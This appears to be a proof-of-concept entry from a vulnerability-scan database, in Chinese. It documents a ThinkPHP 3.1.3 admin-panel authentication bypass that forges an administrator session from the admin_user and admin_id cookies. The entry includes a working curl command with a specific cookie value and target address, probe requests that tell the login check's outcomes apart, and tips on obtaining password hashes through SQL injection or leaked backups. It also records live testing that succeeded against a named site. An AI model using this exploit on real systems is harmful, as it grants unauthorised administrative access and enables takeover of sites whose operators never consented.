# ThinkPHP3 后台 Cookie 会话伪造（admin_user=username + admin_id=password哈希）

- **code**: thinkphp3-后台-cookie-会话伪造-admin_user-username-admin_id-password哈希
- **kind**: poc
- **category**: auth-bypass
- **component**: ThinkPHP 3.1.3 后台
- **severity**: critical
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.22（聚宝阁，PHP 5.6.40 + ThinkPHP3）实测：Cookie admin_user=the; admin_id=b515a2b93dbec89932bf86fec3466f44 → User/index 200/40167B；把 today.admin 表全部 11 条 (username,password) 逐一当 Cookie 打 → 11/11 全部 200/4016x 通过（含中文用户名 URL 编码）；不带该 Cookie 全部 302 到 Index/login。同批哈希打 203.0.113.101 全部 302 拒绝（两站不共用 admin 表）。
- **path**: pocs/thinkphp3-后台-cookie-会话伪造-admin_user-username-admin_id-password哈希/poc.http
- **tags**: thinkphp,会话伪造,cookie,auth-bypass,后台
- **created_at**: 2026-10-13T08:43:08.006Z
- **found_by**: vuln-scan

## 描述

ThinkPHP 3.1.3 后台把 Cookie 直接当会话凭据：admin_user=admin.username、admin_id=admin.password(哈希)。拿到 admin 表任意一行即可无密码伪造管理员会话，无需破解明文。

## 用法

```
curl -k -s --noproxy '*' \
  -H "Host: example.jbg.mysqbbthisgoodsfor33333user.top" \
  -H "Cookie: admin_user=the; admin_id=b515a2b93dbec89932bf86fec3466f44" \
  "https://203.0.113.22/example.com?g=Admin&m=User&a=index"
需替换：Host（白名单域名）、admin_user（admin 表 username）、admin_id（该行 password 字段）。
```

## 正文

```
## 原理
ThinkPHP 3.1.3 系后台 CommonAction::islogin() 把 Cookie 当作会话凭据，直接与 admin 表字段比对。
页面 trace 报错（调试模式开启时）会精确泄露行号，可据此重建真实逻辑：
[8] Undefined index: admin_user  .../Admin/CommonAction.class.php 第 19 行
[8] Undefined index: admin_id    .../Admin/CommonAction.class.php 第 20 行
[8] Undefined variable: tmp      .../Admin/CommonAction.class.php 第 31 行
即：读 $_COOKIE['admin_user']（=admin.username）与 $_COOKIE['admin_id']（=admin.password 字段值），
第 31 行用 $tmp 承接 M('admin')->where(...)->find() 结果。因此**只要拿到 admin 表任意一行的
(username, password) 即可无密码伪造该管理员会话**（password 是哈希，不是明文，无需破解）。

## 复现
### 1) 先判断白名单/路由是否放行（对照实验，区分两种 302）
GET /example.com?g=Admin&m=User&a=index  HTTP/1.1
Host: <非白名单域名>            → 302 Location: /example.com?          （白名单拒绝 redirect('/')）
Host: <白名单域名>              → 302 Location: /example.com?g=Admin&m=Index&a=login （白名单过、登录检查拒绝）

### 2) 决定性探针（IndexAction::index() 直接暴露 islogin() 结果）
GET /example.com?g=Admin&m=Index&a=index
  302 → /example.com?g=Admin&m=Main&a=index    = islogin() 通过
  302 → /example.com?g=Admin&m=Index&a=login   = islogin() 拒绝

### 3) 伪造会话
GET /example.com?g=Admin&m=User&a=index HTTP/1.1
Host: <白名单域名>
Cookie: admin_user=the; admin_id=b515a2b93dbec89932bf86fec3466f44
→ HTTP 200 / 40167 字节 / title「用户管理」

## 注意事项
- 中文用户名需 URL 编码放进 Cookie 头（PHP $_COOKIE 会自动解码），实测通过。
- 单发 admin_user 或单发 admin_id 都不行，必须两者同时存在。
- 若站点同时是旧版裸 Cookie 逻辑（if(empty($_COOKIE["admin_user"])) return false;），
  则任意非空 admin_user 即可，无需 admin_id —— 先用探针区分版本。
- 哈希来源：SQL 注入 / 备份文件 / 其它站同表泄露 / 配置文件泄露。
  哈希算法常见 md5(cfg_adminkey . md5(pass))。
```
